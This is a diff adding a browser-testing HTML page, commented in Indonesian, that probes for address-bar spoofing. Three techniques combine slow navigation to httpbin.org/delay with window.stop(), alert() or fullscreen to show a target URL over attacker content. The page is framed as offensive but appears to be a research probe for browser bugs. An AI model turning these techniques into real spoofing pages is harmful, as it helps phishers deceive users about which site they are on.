@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Slow Load Commit Race</title>
+<style>
+  body { font-family: 'Segoe UI', sans-serif; padding:40px; background:#f0f4ff; }
+  button { padding:14px 24px; background:#0078d4; color:#fff; border:none;
+           border-radius:6px; font-size:15px; cursor:pointer; margin:8px 0; display:block; }
+  pre { font-size:13px; background:#fff; padding:14px; border-radius:6px; margin-top:14px; }
+</style>
+</head>
+<body>
+<h3>Slow Commit Race — Address bar vs content mismatch</h3>
+<p style="font-size:13px;color:#888;margin-bottom:14px;">
+Bug klasik: navigasi ke target lambat (commit tapi belum paint).
+Saat commit terjadi, address bar berubah, tapi konten belum tampil.
+Di jeda itu, halaman attacker masih terlihat = address bar target, konten attacker.
+</p>
+
+<button onclick="slowLoad1()">Teknik 1: Slow target + attacker content</button>
+<button onclick="slowLoad2()">Teknik 2: Slow target + alert race</button>
+<button onclick="slowLoad3()">Teknik 3: Slow target + fullscreen hide</button>
+
+<pre id="log"></pre>
+<script>
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+
+// Teknik 1: Buka window ke target lambat. Saat address bar update tapi
+// konten belum tampil, halaman asli (attacker) masih visible di window lama.
+// Bug di beberapa browser: address bar JENDRAL sudah berubah, tapi
+// konten window lama masih attacker.
+function slowLoad1(){
+  log('TEKNIK 1: Slow target load');
+  log('  Step 1: Buka httpbin delay 10s (halaman lambat)');
+  log('  Step 2: Saat address bar update tapi konten belum tampil:');
+  log('         address bar = httpbin.org/delay/10');
+  log('         konten = masih halaman attacker (kosong/loading)');
+  log('  Step 3: Tapi di tab INI (attacker), cek address bar: apakah');
+  log('         address bar tab ini juga ikut berubah?');
+  log('  >>> Kalau address bar tab INI berubah ke httpbin padahal');
+  log('      konten masih halaman attacker = SPOOF!');
+  log('');
+  log('  Mulai navigasi slow load...');
+  // Gunakan Service Worker atau fetch dengan delay untuk simulasi
+  // Coba location.assign ke endpoint lambat
+  log('  location.assign ke httpbin delay...');
+  location.assign('https://httpbin.org/delay/10');
+  // window.stop setelah 200ms — batalkan navigasi tapi address bar mungkin sudah update
+  setTimeout(function(){
+    try { window.stop(); } catch(e){}
+    log('  window.stop() dipanggil. CEK ADDRESS BAR SEKARANG!');
+    log('  >>> Address bar: ' + location.href);
+    log('  >>> Konten: apakah masih halaman ini (attacker)?');
+    log('  >>> Kalau address bar = httpbin tapi konten = attacker = SPOOF!');
+  }, 200);
+}
+
+// Teknik 2: Slow target + alert (alert block address bar update)
+function slowLoad2(){
+  log('TEKNIK 2: Slow target + alert race');
+  log('  Step 1: Buka window ke target lambat');
+  var w = window.open('https://httpbin.org/delay/8', '_blank');
+  if (!w){ log('  window.open blocked. Test gagal.'); return; }
+  log('  Step 2: setTimeout 500ms → alert di window attacker');
+  setTimeout(function(){
+    log('  alert() muncul. CEK address bar window BARU (di belakang alert)');
+    log('  >>> Window baru address bar: tampil apa?');
+    log('  >>> Konten window baru: tampil apa?');
+    alert('Test 2: Lihat window baru di belakang alert ini. Address bar tampil apa?');
+    log('  Alert closed.');
+  }, 500);
+}
+
+// Teknik 3: Slow target + fullscreen (fullscreen bisa freeze address bar update)
+function slowLoad3(){
+  log('TEKNIK 3: Slow target + fullscreen');
+  log('  Step 1: Fullscreen (hide real toolbar)');
+  try { document.documentElement.requestFullscreen(); } catch(e){}
+  log('  Step 2: location.assign ke target lambat');
+  log('  Step 3: window.stop setelah 300ms');
+  setTimeout(function(){
+    try { window.stop(); } catch(e){}
+    log('  Step 4: exit fullscreen');
+    try { document.exitFullscreen(); } catch(e){}
+    log('  >>> CEK ADDRESS BAR setelah exit fullscreen:');
+    log('  >>> Address bar: ' + location.href);
+    log('  >>> Konten: masih halaman attacker atau sudah berubah?');
+    log('  >>> Kalau address bar = httpbin tapi konten = attacker = SPOOF!');
+  }, 300);
+  location.assign('https://httpbin.org/delay/8');
+}
+</script>
+</body>
+</html>
